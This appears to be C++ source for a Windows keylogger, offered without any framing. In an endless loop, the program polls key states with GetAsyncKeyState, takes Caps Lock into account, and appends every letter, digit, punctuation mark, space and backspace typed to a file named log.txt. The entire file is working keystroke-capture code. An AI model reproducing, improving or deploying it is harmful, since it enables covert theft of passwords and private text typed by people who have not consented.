#include <Windows.h>
#include <iostream>
#include <fstream>
using namespace std;


int main() {
    fstream file;
    while (1) {
        file.open("log.txt", ios::app);
        for (int i = 0x30; i <= 0x5A; i++) {
            int check = (GetKeyState(0x14) & 1);
            if (GetAsyncKeyState(i) == -32767) {
                if (check) {
                    file << (char)(i);
                }
                else if ((i >= 'A' && i <= 'Z')){
                    file << (char)(i + 32);
                }
                else {
                    file << (char)(i);
                }
            }
        }
        for (int i = 0xBA; i <= 0xDF; i++) {
            if (GetAsyncKeyState(i) == -32767) {
                switch (i) {
                case 0xBA:
                    file << ';';
                    break;
                case 0xBB:
                    file << '+';
                    break;
                case 0xBC:
                    file << ',';
                    break;
                case 0xBD:
                    file << '-';
                    break;
                case 0xBE:
                    file << '.';
                    break;
                case 0xBF:
                    file << '/';
                    break;
                case 0xC0:
                    file << '`';
                    break;
                case 0xDB:
                    file << '[';
                    break;
                case 0xDC:
                    file << '\\';
                    break;
                case 0xDD:
                    file << ']';
                    break;
                case 0xDE:
                    file << '\'';
                    break;
                }
            }
        }
        if (GetAsyncKeyState(0x20) == -32767) {
                file << ' ';
        }

        if (GetAsyncKeyState(0x8) == -32767) {
            file << "<BACKSPACE>";
        }
        file.close();
    }
}